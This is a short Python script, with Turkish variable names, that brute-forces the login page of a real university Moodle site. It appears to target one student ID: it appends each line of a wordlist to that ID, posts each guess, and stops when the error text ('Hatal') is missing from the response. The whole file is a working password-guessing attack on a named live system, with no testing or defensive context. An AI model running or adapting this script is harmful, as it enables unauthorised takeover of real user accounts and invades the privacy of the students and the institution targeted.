import requests, math, random


    
def run( sifre, no):
  
    veri={
"anchor":"",
"username": sifre[:9],
"password": sifre,
}
    r=requests.post("https://ue.harran.edu.tr/login/index.php", data= veri)
    
    if  "Hatal" in r.text:
        print(str(no)+", ",flush=True, end="")
    else:
        
        print()
        print(sifre)
        quit()

f=open("pass.txt","r")
ff=f.readlines()
f.close()

print('basladi')

for no,i in enumerate(ff):
   # if no < 2300:
#      continue
    i=i.strip()
  

    run( "170504001" + i , no )
    
   
